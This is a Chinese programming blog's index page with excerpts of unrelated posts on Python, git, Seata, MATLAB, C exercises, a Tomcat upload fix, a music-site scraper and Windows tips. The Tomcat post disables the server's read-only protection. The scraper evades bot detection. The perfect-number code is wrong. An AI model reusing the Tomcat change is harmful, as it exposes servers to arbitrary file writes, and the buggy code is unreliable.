<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da98670d8dd4df508c8787deac3d2ba0/" rel="bookmark">
			python字符串、列表、字典删除总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字符串：
replace()：替换
strip()：删除两端字符
rstrip()：删除最右边字符
lstrip() ：删除最左边字符
列表：
1.pop(index)
2.remove(元素)
3.del 切片
4.clear()清空列表
字典：
1.pop(ke) #有返回值
2.del dic[key]
3.popitem() #随机删除
4.clear() #清空字典
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b571c511e482f82e676906375a2e72d/" rel="bookmark">
			java企业级电商 initial总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git 仓库建立及目录划分 git 权限配置
注意添加个人公钥，不是部署公钥
ssh-keygen -t rsa -C “your_email@example.com”
cat …public
gitignore配置
无需上传？
.DS_Store /node_modules/ /dist/ npm-debug.log	git上传
git merge origin master git tag tag-dev-initial git push origin tag-dev-initial git status git add . git commit -am ' ' git push git分支使用规范
切换主分支 git init 新建并切换分支 git checkout -b mall -v1.0 查看分支 git branch npm npm install -g --registry=https://registry.npm.taobao.org npm install webpack -g 全局安装 npm install webpack@1.15.0 --save-dev 项目依赖 cat package.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b571c511e482f82e676906375a2e72d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd3637061592932bebeb973b697d8929/" rel="bookmark">
			Seata-Saga
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		seata saga模式 整理自seata 官网 seata.io
为什么要用saga模式
场景，调用第三方系统，且不能提供TCC接口，否则还是建议使用TCC
优点
1、适用场景
2、如果一个过程已经完善了，后续可以复用
缺点
1、侵入性强
2、要新增状态的时候或者在整个事务中增加一个流程（状态），需要修改json
Saga 服务设计的实践经验 允许空补偿 空补偿：原服务未执行，补偿服务执行了出现原因： 原服务 超时（丢包）Saga 事务触发 回滚未收到 原服务请求，先收到 补偿请求 所以服务设计时需要允许空补偿, 即没有找到要补偿的业务主键时返回补偿成功并将原业务主键记录下来
防悬挂控制 悬挂：补偿服务 比 原服务 先执行出现原因： 原服务 超时（拥堵）Saga 事务回滚，触发 回滚拥堵的 原服务 到达 所以要检查当前业务主键是否已经在空补偿记录下来的业务主键中存在，如果存在则要拒绝服务的执行
幂等控制 原服务与补偿服务都需要保证幂等性, 由于网络可能超时, 可以设置重试策略，重试发生时要通过幂等控制避免业务数据重复更新 缺乏隔离性的应对 由于 Saga 事务不保证隔离性, 在极端情况下可能由于脏写无法完成回滚操作, 比如举一个极端的例子, 分布式事务内先给用户A充值, 然后给用户B扣减余额, 如果在给A用户充值成功, 在事务提交以前, A用户把余额消费掉了, 如果事务发生回滚, 这时则没有办法进行补偿了。这就是缺乏隔离性造成的典型的问题, 实践中一般的应对方法是： 业务流程设计时遵循“宁可长款, 不可短款”的原则, 长款意思是客户少了钱机构多了钱, 以机构信誉可以给客户退款, 反之则是短款, 少的钱可能追不回来了。所以在业务流程设计上一定是先扣款。有些业务场景可以允许让业务最终成功, 在回滚不了的情况下可以继续重试完成后面的流程, 所以状态机引擎除了提供“回滚”能力还需要提供“向前”恢复上下文继续执行的能力, 让业务最终执行成功, 达到最终一致性的目的。 性能优化 配置客户端参数client.rm.report.success.enable=false，可以在当分支事务执行成功时不上报分支状态到server，从而提升性能。 当上一个分支事务的状态还没有上报的时候，下一个分支事务已注册，可以认为上一个实际已成功
API referance StateMachineEngine API public interface StateMachineEngine { /** * start a state machine instance * @param stateMachineName * @param tenantId * @param startParams * @return * @throws EngineExecutionException */ StateMachineInstance start(String stateMachineName, String tenantId, Map&lt;String, Object&gt; startParams) throws EngineExecutionException; /** * start a state machine instance with businessKey * @param stateMachineName * @param tenantId * @param businessKey * @param startParams * @return * @throws EngineExecutionException */ StateMachineInstance startWithBusinessKey(String stateMachineName, String tenantId, String businessKey, Map&lt;String, Object&gt; startParams) throws EngineExecutionException; /** * start a state machine instance asynchronously * @param stateMachineName * @param tenantId * @param startParams * @param callback * @return * @throws EngineExecutionException */ StateMachineInstance startAsync(String stateMachineName, String tenantId, Map&lt;String, Object&gt; startParams, AsyncCallback callback) throws EngineExecutionException; /** * start a state machine instance asynchronously with businessKey * @param stateMachineName * @param tenantId * @param businessKey * @param startParams * @param callback * @return * @throws EngineExecutionException */ StateMachineInstance startWithBusinessKeyAsync(String stateMachineName, String tenantId, String businessKey, Map&lt;String, Object&gt; startParams, AsyncCallback callback) throws EngineExecutionException; /** * forward restart a failed state machine instance * @param stateMachineInstId * @param replaceParams * @return * @throws ForwardInvalidException */ StateMachineInstance forward(String stateMachineInstId, Map&lt;String, Object&gt; replaceParams) throws ForwardInvalidException; /** * forward restart a failed state machine instance asynchronously * @param stateMachineInstId * @param replaceParams * @param callback * @return * @throws ForwardInvalidException */ StateMachineInstance forwardAsync(String stateMachineInstId, Map&lt;String, Object&gt; replaceParams, AsyncCallback callback) throws ForwardInvalidException; /** * compensate a state machine instance * @param stateMachineInstId * @param replaceParams * @return * @throws EngineExecutionException */ StateMachineInstance compensate(String stateMachineInstId, Map&lt;String, Object&gt; replaceParams) throws EngineExecutionException; /** * compensate a state machine instance asynchronously * @param stateMachineInstId * @param replaceParams * @param callback * @return * @throws EngineExecutionException */ StateMachineInstance compensateAsync(String stateMachineInstId, Map&lt;String, Object&gt; replaceParams, AsyncCallback callback) throws EngineExecutionException; /** * skip current failed state instance and forward restart state machine instance * @param stateMachineInstId * @return * @throws EngineExecutionException */ StateMachineInstance skipAndForward(String stateMachineInstId) throws EngineExecutionException; /** * skip current failed state instance and forward restart state machine instance asynchronously * @param stateMachineInstId * @param callback * @return * @throws EngineExecutionException */ StateMachineInstance skipAndForwardAsync(String stateMachineInstId, AsyncCallback callback) throws EngineExecutionException; /** * get state machine configurations * @return */ StateMachineConfig getStateMachineConfig(); } StateMachine Execution Instance API: StateLogRepository stateLogRepository = stateMachineEngine.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd3637061592932bebeb973b697d8929/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdffd12d8abdb34e18801e2a2d745961/" rel="bookmark">
			interp1函数_matlab自带的插值函数interp1的四种插值方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 (1) Nearest方法速度最快，占用内存最小，但一般来说误差最大，插值结果最不光滑。
(2) Spline三次样条插值是所有插值方法中运行耗时最长的，插值函数及其一二阶导函数都连续，是最光滑的插值方法。占用内存比cubic方法小，但是已知数据分布不均匀的时候可能出现异常结果。
(3) Cubic三次多项式插值法中，插值函数及其一阶导数都是连续的，所以插值结果比较光滑，速度比Spline快，但是占用内存最多。
示例：
x=0:2*pi;
y=sin(x);
xx=0:0.5:2*pi;
一、分段线性插值-默认值
%interp1对sin函数进行分段线性插值，调用interp1的时候，默认的是分段线性插值
y1=interp1(x,y,xx);
figure
plot(x,y,'o',xx,y1,'r')
title('分段线性插值')
分段线性插值 二、临近插值-nearest
y2=interp1(x,y,xx,'nearest');
figure
plot(x,y,'o',xx,y2,'r');
title('临近插值')
临近插值 三、球面插值-spline
y3=interp1(x,y,xx,'spline');
figure
plot(x,y,'o',xx,y3,'r')
title('球面插值')
球面插值 四、三次多项式插值法-cubic
y4=interp1(x,y,xx,'cubic');
figure
plot(x,y,'o',xx,y4,'r');
title('三次多项式插值')
三次多项式插值法 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0522c7b81a718c58d152ac632521a3b6/" rel="bookmark">
			习题6-3 使用函数输出指定范围内的完数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用函数输出指定范围内的完数 本题要求实现一个计算整数因子和的简单函数，并利用其实现另一个函数，输出两正整数m和n（0&lt;m≤n≤10000）之间的所有完数。所谓完数就是该数恰好等于除自身外的因子之和。例如：6=1+2+3，其中1、2、3为6的因子。
函数接口定义
int factorsum( int number ); void PrintPN( int m, int n ); 其中函数factorsum须返回int number的因子和；函数PrintPN要逐行输出给定范围[m, n]内每个完数的因子累加形式的分解式，每个完数占一行，格式为“完数 = 因子1 + 因子2 + … + 因子k”，其中完数和因子均按递增顺序给出。如果给定区间内没有完数，则输出一行“No perfect number”。
思路：首先判断出是否为完数，判断条件为所有因子的总和除以4等于这个数，那该数为完数
int factorsum(int number) { int sum = 0;	//因子总和 for(int i = 1; i &lt; number; i++){ if(number % i == 0){ sum += number / i + i; } } return sum / 4; } 思路：需要打印所有因子，用到数组
void PrintPN(int m, int n) { int nums[100]; int state = -1; for(int i = m; i &lt;= n; i++){ int num = 0;	//数组下标,及因子数量 if(factorsum(i) == i){ for(int j = 2; j &lt;= i; j++){ if(i % j == 0){ nums[num] = i / j;	//将每个因子存入数组中 num++;	//记下总数 } } state = 1;	//找到完数改变状态 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0522c7b81a718c58d152ac632521a3b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/887543f9bf2c1730f3bed6a0b55c50e0/" rel="bookmark">
			ssim算法计算图片_图片的相似度--图像结构相似度SSIM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算两张图片的相似度 图片结构相似度（SSIM） SSIM的全称为structural similarity index，结构相似性，分别从亮度、对比度、结构三方面度量图像相似性。 均值作为亮度的估计，标准差作为对比度的估计，协方差作为结构相似程度的度量。 SSIM取值范围[0,1]，值越大，表示图像失真越小，越相似。 计算步骤：
在实际应用中，可以利用滑动窗将图像分块，令分块总数为N，考虑到窗口形状对分块的影响，采用高斯加权计算每一窗口的均值、方差以及协方差；然后计算对应块的结构相似度SSIM，最后将平均值作为两图像的结构相似性度量，即平均结构相似性MSSIM。
优点： 结构相似度指数从图像组成的角度将结构信息定义为独立于亮度、对比度的反映场景中物体结构的属性，并将失真建模为亮度、对比度和结构三个不同因素的组合。 应用： SSIM已经成为广播和有线电视中广为使用的一种衡量视频质量的方法。在超分辨率，图像去模糊 中都有广泛的应用。
uX、uY分别表示图像X和Y的均值，σX、σY分别表示图像X和Y的标准差，σXσX、σYσY分别表示图像X和Y的方差。σXY代表图像X和Y协方差。C1，C2和C3为常数，是为了避免分母为0而维持稳定。通常取C1=(K1L)^2, C2=(K2L)^2, C3=C2/2, 一般地K1=0.01, K2=0.03, L=255（ 是像素值的动态范围，一般都取为255）
import cv2 class StructureSimComp(object): def __init__(self,w,h): self.h = h self.w = w self.C1 = 6.5025 self.C2 = 58.5225 self.filterSize = 3 #if filterX = 0 then opencv inner use : filterX = 0.3*((filterSize-1)*0.5 - 1) + 0.8 self.filterX = 0 def run(self, imgx, imgy): # https://docs.opencv.org/2.4/doc/tutorials/highgui/video-input-psnr-ssim/video-input-psnr-ssim.html # https://blog.csdn.net/chaipp0607/article/details/70158835 imgx = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/887543f9bf2c1730f3bed6a0b55c50e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b80e2633ad5d142e4f23303e665e6bc/" rel="bookmark">
			C语言从入门到精通：嵌套循环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C编程语言允许使用一个循环内嵌套的另一个循环。下面的内容展示几个例子来说明这个概念。
语法
在C语言中嵌套for语句循环的语法如下：
for ( init; condition; increment ){ for ( init; condition; increment ) { statement(s); } statement(s);}
在C编程语言中嵌套while循环声明的语法如下：
while(condition){ while(condition) { statement(s); } statement(s);}
在C编程语言嵌套do...while循环语句的语法如下：
do{ statement(s); do { statement(s); }while( condition );}while( condition );
在循环嵌套最后需要说明的是，可以把任何类型的循环的任何其他类型的循环内。例如，对于环可以是一个while循环，或反之亦然内部。
例子：
如果你在学习C/C++的过程中遇到了问题，可以来加入小编的企鹅圈问小编哦~小编很热情的(●’◡’●)
下面的程序使用嵌套for循环从2至100找出素数：
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
#include &lt;stdio.h&gt; int main (){ /* local variable definition */ int i, j; for(i=2; i&lt;100; i++) { for(j=2; j &lt;= (i/j); j++) if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b80e2633ad5d142e4f23303e665e6bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2e9ea11313b914b876004e682a5fdf1/" rel="bookmark">
			SpringMVC跨服务器上传报错：returned a response status of 405 Method Not Allowed
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题原因：这是因为Tomcat默认的为只读，不允许写入操作
解决方法：修改Tomcat安装目录下的web.xml文件
&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; 添加了：
&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d74d4d7f35769da9dff1fac871b14290/" rel="bookmark">
			5g信号频率是多少赫兹_美陆军投资研发新型5G射频开关，其能效是现有同类产品的50倍...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 据美陆军网 站2020年5月26日报道，随着5G的上市，美陆军投资的新研究项目开发出一种新型射频开关，其能效是目前使用的同类产品的50倍。 在美国陆军作战能力发展司令部陆军研究实验室下属的陆军研究办公室(Army Research Office)的资助下，德克萨斯大学奥斯汀分校和法国里尔大学(University of Lille)的研究人员研发了一种新组件，它可以更有效地使用最高的5G频率，这样可以延长设备的电池寿命，加快用户处理流式高清媒体等数据的速度。 智能手机上通常都装有执行多项任务的开关。其中一个主要任务是在不同的网络和频率之间来回切换：4G、WiFi、LTE、蓝牙等。当前执行此任务的射频开关总是处于运行状态，消耗宝贵的处理能力和电池寿命。 射频开关普遍应用于军事通信系统和雷达系统中。与现有射频开关相比，这些新型开关可以提供更大的性能优势，并且可以延长移动通信和高级可重构系统的电池寿命。研究团队将此项研究成果发表在《自然电子》杂志。 领导此项研究的科克雷尔工程学院电气与计算机工程系教授Deji Akinwande博士表示，很明显，现有开关消耗了大量功率。新型开关可以在100GHz频率传输HDTV数据流，这是宽带开关技术的一项成就。 这种新型开关保持关闭状态，为其他进程节省电池寿命，除非它们正在积极帮助设备在网络之间切换。研究人员还展示了在高于5G速度基线下传输数据的能力。 先前的研究人员已经在5G频谱的低频段取得了成功，那里的数据传输速度较慢，但数据可以传输更远距离。这种新型开关是第一个可以在从低频段的吉赫兹频率到高频段的太赫兹频率的频谱范围内工作的开关，而太赫兹频率未来可能成为6G发展的关键。 该团队研发的新型开关使用纳米材料的六边形氮化硼，这是一种与石墨烯来自同一家族的新兴纳米材料。开关的结构包括一层硼和氮原子，它们呈蜂窝状夹在一对金电极之间。六角氮化硼是目前已知最薄的绝缘体，厚度仅为0.33纳米。 这些射频开关的应用不仅限于智能手机，卫星系统、智能无线电台、可重构通信和物联网都可能使用这种新型开关。此外，这些开关可以在柔性基板上实现，适合士兵可穿戴的无线电台和通信系统，能够提升系统能效、延长电池寿命、获得更快的数据传输速度以及实现其他防御技术。 来源：电科小氙
在线讲座：应对射频接收机测试的挑战(7月23日)
最新5G系列研讨会：在线讲座：5G信号生成技巧及测试挑战(7月28日)在线讲座：利用信道模拟器进行5G NR Massive MIMO测试(7月29日)在线讲座：5G大规模多端口器件测试(7月30日)在线讲座：一种新型高精度5G信号EVM创新测量方法(7月31日) 最新卫星系列研讨会： 在线讲座：通信卫星系统物理层设计与仿真---链路建模、射频架构、相控阵和天线单元等(7月21日)
在线讲座：基于信道仿真的卫星通信设备性能测试(7月22日) 原创RF测试笔记：数字调制系列：IQ调制器特性 NEW六问射频脉冲频谱测试如何准确测试75 Ohm系统的信号？ 如何准确测试相位噪声射频脉冲频谱及退敏效应简述频谱分析系列：如何选择显示检波器频谱分析系列：为什么需要预选器？频谱分析系列：浅谈分辨率带宽RBW 频谱分析系列：如何理解FFT中的频谱泄露效应？
频谱分析系列：如何理解FFT中时间窗与RBW的关系
频谱分析系列：为什么降低VBW不会降低频谱仪底噪？数字调制系列：如何理解IQ ？数字调制系列：IQ基本理论 数字调制系列：IQ调制及解调简述 噪声系数系列：噪声来源、定义及影响
噪声系数系列：天线噪声温度测试方法
噪声系数系列：噪声系数测试之增益法 噪声系数系列：浅析AGC电路噪声系数的测试
噪声系数系列：浅析多通道接收单元噪声系数的测试
噪声系数系列：镜频抑制滤波器对射频接收前端输出噪声的影响
选择示波器时的“5倍法则” 投稿&amp;专栏合作 请加小编微信 | 微信号：18675536035 请戳右下角，给我一点好看！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6f44966fa4d847fed531111f14adb6c/" rel="bookmark">
			二阶魔方万能还原公式_二阶魔方七步还原法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二阶魔方没有七步还原法，这种方法是用来还原三阶魔方的。二阶魔方又称口袋魔方、迷你魔方、小魔方、冰块魔方，为2×2×2的立方体结构。本身只有8个角块，没有其他结构的方块。结构与三阶魔方相近。
七步还原法的步骤是顶层十字、底棱归位、底角归位、棱块归位、顶棱面位、顶角面位、顶棱归位、顶角归位。
首先拼出一个顶层十字，然后将整个面拼好，再拼其他的四个角块，拼的时候注意颜色要一一进行对应。
然后进行中层边块归位，把白色面转向下，找出红绿边块，然后使用公式将边块归位。
接下来是顶层边块调整向上，做出黄十字，没有十字可以多做几遍公式，按照公式重复转动。
再将黄色角块调整到十字周围，将四角的黄色块定位，边上的色块再调整到对应的位置之后就完成了。
三阶魔方是很常见的一种魔方，它还可以使用层先法还原。这个方法要先构建十字结构，然后还原第一层的其余角块，之后还原第二层后在顶层构建一个十字，接着还原顶层的角块方向，让顶面颜色相同，最后还原顶层的角块位置就完成了。
魔方在还原的时候都是按照公式转动的，比较基础的魔方就是三阶魔方，很多高阶的魔方和特殊魔方都是按照三阶魔方的还原方法进行还原的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09959d91faea33bb810f60e7379dce85/" rel="bookmark">
			酷狗音乐的爬取，基于python，从无到有完整教程-下：功能代码讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		酷狗音乐的爬取，从无到有完整教程-下：功能代码讲解 是的我又回来了，这次是代码的讲解哦。
参数项生成 上一章我们提到，在包含了歌曲url，歌曲信息的请求中，有几个参数项的值是随机数就可以，但是，你仔细看，虽然是随机数，有些参数项的值就是数字，有些就是数字和字符混合，所以这里我们不仅要生成随机数，还要分类生成不同的随机数。
给大家看一下我写的的生成函数(目前是我感觉最明了的方法了&gt;_&lt;)
调用这个函数需要提供两个参数，一是DataType，也就是要生成的类型，是纯字符还是纯数字还是混合，还有一个就是length，也就是生成的字符串长度，这个很好理解就不多说嘻嘻
请求中等待时间的随机 由于在请求网页数据的时候需要等待网页加载完在获得网页当前的元素，所以就会需要一个等待时间，但是固定的等待时间，容易让浏览器觉得你是个假人，不能很好的伪装(我也是从别人的blog看的哈哈)，从而让服务器抹掉你的cookies或者ip什么的，嗯对没错，就是这样&gt;//&gt;
延时后再加个随机秒数就好了
def gen_random_sec(fix = 1): a = random.random() a = a + fix return a 创建虚拟浏览器并获取各类榜单的href 用selenium库中的webdriver来创建
edge_driver = r"E:\venv\Lib\site-packages\selenium\webdriver\msedge\msedgedriver.exe" # 需要把该路径加到windows运行环境中 browser = webdriver.Edge(executable_path=edge_driver) 请求酷狗排行榜页面
def get_category_rank(url='https://www.kugou.com/yy/html/rank.html'): browser.get(url) # 请求页面，即浏览器打开该页面 time.sleep(gen_random_sec()) print(gen_random_sec()) data = browser.page_source # 获取当前页面的html组成元素 soup = BeautifulSoup(data, 'html.parser') # 网页带有16进制，需解码，soup就等于网页的元素了，可以用来提取想要的数据 rank_group = soup.findAll('a',attrs={'hidefocus':'true'}) # 这里抓取的就是左边的各类排行榜元素，attrs={}里面是他们的元素属性 category_rank = [] for i, value in enumerate(rank_group): # 收集所有类别榜单的href category_rank.append(value.attrs['href']) return category_rank 抓取各类排行榜的歌曲播放页面href 这个直接根据attrs特征抓就完事了，上码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09959d91faea33bb810f60e7379dce85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a8835afa3b3cf3e0965d4699619a603/" rel="bookmark">
			冒泡排序法_【C语言】冒泡排序法与选择排序法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言编程必掌握的两种排序方法：冒泡排序法和选择排序法 首先要看图自己梳理一遍规律和思路（这很重要）
或是在往下看的过程反复搭配动图进行理解，非常感谢制作这两幅动图的人，可以让大家比较直观的理解冒泡排序法和选择排序法
冒泡排序法 图片来自网络（侵删） 整体思路（具体看代码） 冒泡排序法就是将 一堆数 从前往后 两个两个 逐个扫描，两个数将大的数放到后边，这样扫一遍，就可以在这堆末尾排好一个数（你可以理解为从前往后扫，把大的数从后依次往前排），仔细观察，扫描一次，排好一个数，有十个数，扫九次就排好了，（别问为什么是九次，你想想后面九个数排好了第一个数还用排吗）所以编程首先要有一个for循环在最外层for（i=0;i&lt;9;i++）来控制扫描的遍数，其次你要往过“扫”啊，这个“扫”的过程也就是两个数两个数比较排列的过程，所以要在前面的for循环里再放一个for循环for(i=0;i&lt;9-n;i++)，用这个for循环往后扫，在这个循环里用if语句判断，如果前一个数大于后面那个数，就交换两个数。
以下代码搭配动图食用 #include&lt;stdio.h&gt; main() { int n,i,j,k,a[10];//定义变量 printf("输入十个数:n");//通过循环给a这个数组输入十个数 for(i=0;i&lt;10;i++) scanf("%d",&amp;a[i]); printf("n"); //回车换行 for(n=0;n&lt;9;n++)//这个循环是整体扫描十个数的次数，扫一次排好一个数，扫九次 { //故循环九次 for(i=0;i&lt;9-n;i++)//这里控制扫描的过程 { //这个i&lt;9-n是控制扫描的这堆数的哪里 //因为扫一次在末尾排好一个数，排好的数不用扫了，所以需要扫描的数少一位 if(a[i]&gt;a[i+1]) { j=a[i];//以下三行语句是交换两个数 a[i]=a[i+1]; a[i+1]=j; } } } for(k=0;k&lt;10;k++)//通过循环将排好的数从数组中逐个输出 printf("%d,",a[k]); printf("n"); } 选择排序法 图片来自网络（侵删） 整体思路（详细看代码） 选择排序法是将一堆数，从前往后逐个扫描
比如说有十个数，从前往后扫描一遍就在前面排好了一位数
那么要排好十个数就要扫描九遍（九个数排好了第十个数就不用排喽）
这样就需要在最外层放一个大循环，控制扫描九次
在扫描一遍的过程需要从前往后边扫描要边记录最小的那个值，最后一步进行替换
在大循环里，也就是从前往后扫描一遍，这需要另一个小循环，从前往后一个一个的读数据
这里要注意写代码的细节：因为在前面排好一个数这个数就不用扫描了，也就是每次扫描的起点是上一次扫描的后一位数，那么在写代码的时候就要注意让小循环循环的起点从上次排好的位置开始
这个小循环在控制从前往后读数的同时也要比较记录最小的数（记住是比较记录，此时不需要进行数字位置的互换，只需记录最小值的“位置”）
然后在扫描一遍完毕后，要进行数字交换，将最小数放到此次扫描的最前面，也就是和此次扫描最前面的那个数交换，而最前面的那个数就要在每次扫描之前标记好，所以要在大循环下紧跟一个k=i（仔细观察就会发现大循环第一次循环时扫描是从第一个数开始的，第二次循环扫描是从第二个数开始的，所以k=i）
#include "stdio.h" int main() { int i,j=0,k,t; int a[10]; printf("请输入十个数进行排序：n"); for(i=0;i&lt;10;i++) scanf("%d",&amp;a[i]); printf("n"); for(i=0;i&lt;=8;i++)//十个数总共要扫描九次 { k=i;//定位每次排好数的位置 for(j=i;j&lt;=9;j++)//i=j每次从上次排好的数开始扫描 { if(a[j]&lt;a[k])//比对大小，记忆小的那个数组元素的下标 k=j; } t=a[k];//扫描完一遍后就将最小的那个数换到前面 a[k]=a[i]; a[i]=t; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a8835afa3b3cf3e0965d4699619a603/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4f1d68f66c0f2f99711fbf4ce54a023/" rel="bookmark">
			卡顿严重_windows10系统卡顿解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		windows10系统卡顿怎么解决呢？很多用户对此还不是很清楚，这里就给大家带来有关windows10系统卡顿怎么解决的回答，希望能够对大家有所帮助。
windows10卡顿解决方法：
1，敲击键盘“win+r”组合键，输入“services.msc”按回车键打开系统服务。
2，进入界面后，找到“Superfetch”并双击将其打开，将“停止该服务并且在恢复关系中把重新启动该服务”改为“无操作”。
关闭系统自动更新程序，这和上面的超级预读服务同时造成系统严重卡顿
关闭方法：
1，按“win+r”组合键，打开运行输入“gpedit.msc”回车键。
2，然后依次展开“计算机配置”——&gt;“管理模板”——&gt;“Windows组件”,然后双击打开“Windows更新”选项。
3，出现如图下窗口，点击左上角“已禁用”，然后点击“确定”就禁止自动更新了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8eb42dc46bdc78ef3ff711899cafe2d/" rel="bookmark">
			scara工业机器人外观_国产SCARA机器人市场占比不断提升,预计2025年国产化率或达75%...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SCARA机器人又被称为多逛街机器人,是圆柱坐标型的特殊类型的工业机器人,当前被广泛应用在塑料工业、汽车工业、电子产品工业、药品工业和食品工业等领域,用于3C电子、半导体、食品、医药等产品的搬取和装配工作。
从应用领域来看,由于SCARA机器人具备负载小、速度快,当前主要应用在3C电子行业,3C电子领域占比达到62%左右。近几年随着3C电子产业的快速发展,以及我国劳动力成本的攀升,使用机器人解放人力的需求愈发强烈,促使SCARA机器人市场需求快速攀升,到2019年市场规模达到16亿元,市场增速在42%左右。
横向对比,由于SCARA机器人拥有同步精度高、效率快等优点,同时相比其他机器人还拥有成本优势,未来在5G带动下,5G移动端、PC端等新型电子装备生产制造将推动自动化设备采购需求,将带动SCARA机器人行业的快速发展,预计到2023年我国SCARA机器人市场规模将有望达到54亿元,年复合增长了达到35．5%。
根据新思界产业研究中心发布的《2020-2025年SCARA机器人行业风险投资态势及投融资策略指引报告》显示,就市场竞争方面,国内外涉及SCARA机器人生产相关的企业众多,海外厂商有爱普生,雅马哈、三菱、东芝、史陶比尔、电装等;国内有众为兴、台达、李群自动化、天太、埃斯顿等。在技术方面,相比于外资品牌,我国产品在部分产品性能方面存在差距,因此当前,爱普生和雅马哈两家外资企业占据我国中高端市场,占据我国SCARA机器人市场份额的56%左右。
当前我国工业面临转型升级,《中国制造2025》中提出要加快发展智能制造装备和产品,组织研发自动执行功能的工业机器人,同时加快汽车、轻工、食品、电子等行业等生产设备的智能化改造。随着传统制造产业向自动化转型,将加速控制系统、伺服装置等设备以及技术的提升,完善机器人产业链,加快实现SCARA机器人的国产化、规模化生产。
